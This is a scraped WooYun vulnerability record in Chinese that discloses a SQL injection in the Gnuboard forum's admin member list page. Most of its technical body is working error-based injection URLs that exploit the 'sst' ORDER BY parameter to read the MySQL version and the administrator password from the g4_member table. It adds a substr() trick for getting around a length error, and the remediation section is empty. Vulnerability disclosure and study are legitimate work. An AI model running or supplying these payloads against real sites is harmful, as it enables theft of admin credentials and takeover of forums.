{"id": 14995, "wybug_id": "wooyun-2013-017698", "wybug_title": "Gnuboard Injection Vulnerabilities", "wybug_corp": "Gnuboard", "wybug_author": "路人甲", "wybug_date": "2013-01-23 10:55", "wybug_open_date": "2013-01-23 10:55", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-01-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： kr比较流行的bbs。只是后台注入思密达～ 详细说明：  此注入属于order by后的注入。可通过order by a,(select语句)执行。此时，括号内的select语句仅当做一个子查询进行使用，当语句语法正确时返回正常页面，无法获取数据。此时我们可以使用mysql报错注入来获取数据。如：http://127.0.0.1/gnuboard/adm/member_list.php?sst=mb_intercept_date,((select+1+from+(select+count(*),concat((select version()),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)>0)获取管理员密码：http://127.0.0.1/gnuboard/adm/member_list.php?sst=mb_intercept_date,((select+1+from+(select+count(*),concat((select mb_password from g4_member limit 0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)>0)当执行以上语句的时候，错误提示为：1242 : Subquery returns more than 1 row原因：此语句默认读取长度为65位，而mb_password为varchar类型，长度为255。此时我们使用substr()函数来限制读取长度。即：substr(mb_password,1,55)即可获取管理密码。   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-01-23 11:30 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  牛逼的路人甲.    \n     2013-01-23 23:45 |    \t\t混世魔王 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | 欢迎友情链接http://26836659.blogcn.com)\t\t \n  牛X，如果没记错，gnuboard 的程序安全性很高。后台拿SHELL。还是个很麻烦的事。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}